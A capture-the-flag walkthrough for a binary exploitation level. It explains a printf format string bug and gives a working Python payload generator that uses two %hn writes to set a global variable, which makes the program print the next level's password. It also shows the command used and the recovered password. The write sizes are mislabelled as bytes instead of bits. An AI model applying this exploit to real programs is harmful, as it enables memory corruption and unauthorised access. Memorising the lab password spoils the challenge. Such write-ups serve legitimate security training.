# Level 04 Walkthrough

## Binary analysis

The global variable `m` (address: 0x08049810) must be set to 0x01025544 to trigger the call to `system("/bin/cat /home/user/level5/.pass")`.

Relevant code:
```
08048444    int32_t p(char* arg1)
08048456        return printf(format: arg1)


08048457    uint32_t n()
0804847a        char buf[0x208]
0804847a        fgets(&buf, n: 0x200, fp: __bss_start)
08048488        p(&buf)
0804848d        uint32_t m_1 = m
0804848d        
08048497        if (m_1 != 0x1025544)
080484a6            return m_1
080484a6        
080484a0        return system(line: "/bin/cat /home/user/level5/.pass")
```

## Exploitation

We use a format string payload to write 0x01025544 into the global variable `m`. To write this value we would need to write 0x01025544 bytes (16,930,116) which would take forever and likely crash the program. Instead of one massive write we can split it into two smaller ones. Since `%n` allow us to write 32-bytes values, here we will use `%hn` for two 16-bytes values. By splitting it into two writes it allow us to only print 0x5544 (21,828) and 0x0102 (258) characters.   

Python script to generate the payload:
```python
import struct

address = 0x08049810
value_high = 0x0102
value_low = 0x5544
offset = 12

payload = struct.pack("<I", address + 2)
payload += struct.pack("<I", address)

padding_high = value_high - 8
payload += f"%{padding_high}x".encode('ascii')
payload += f"%{offset}$hn".encode('ascii')

offset += 1
padding_low = value_low - padding_high - 8
payload += f"%{padding_low}x".encode('ascii')
payload += f"%{offset}$hn".encode('ascii')

with open('payload.txt', 'wb') as f:
    f.write(payload)
```

## Commands used

```
cat /tmp/payload.txt | ./level4
```

## Result

After running the exploit, we get the password for level5:

```
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
